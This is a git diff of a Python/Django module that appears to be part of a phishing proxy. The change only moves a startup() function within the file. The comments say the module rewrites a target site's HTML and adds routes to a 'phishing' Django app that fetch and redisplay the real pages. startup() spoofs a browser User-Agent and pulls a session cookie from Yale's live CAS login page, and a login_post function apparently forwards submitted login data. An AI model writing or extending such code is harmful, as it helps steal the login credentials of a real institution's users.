@@ -6,12 +6,20 @@ import os
 import textwrap
 from .global_vars import SESSION
 
+# Initialize requests session and save cookie dict as global variable
+def startup():
+    global SESSION
+    # initialize a session
+    SESSION = requests.Session()
+    # set the User-agent as a regular browser
+    SESSION.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
+    SESSION.get('https://secure.its.yale.edu/cas/login') #Access website to get session cookie
+
 # Script to parse html of target website
 # For script, img, stylesheet links, add base url to the start
 # For all other links found:
 # 1. Add url to django phishing/urls.py
 # 2. Add function in django phishing/views.py that fetches url from target website and displays content
-
 def parse_html(html, base_url):
     soup = bs(html, "html.parser")
 
@@ -82,15 +90,6 @@ def display_view(url):
     parsed_html = parse_html(html, url)
     # Parse HTML before returning
     return HttpResponse(str(parsed_html))
-
-# Initialize requests session and save cookie dict as global variable
-def startup():
-    global SESSION
-    # initialize a session
-    SESSION = requests.Session()
-    # set the User-agent as a regular browser
-    SESSION.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
-    SESSION.get('https://secure.its.yale.edu/cas/login') #Access website to get session cookie
 
 def login_post(url, data):
     global SESSION
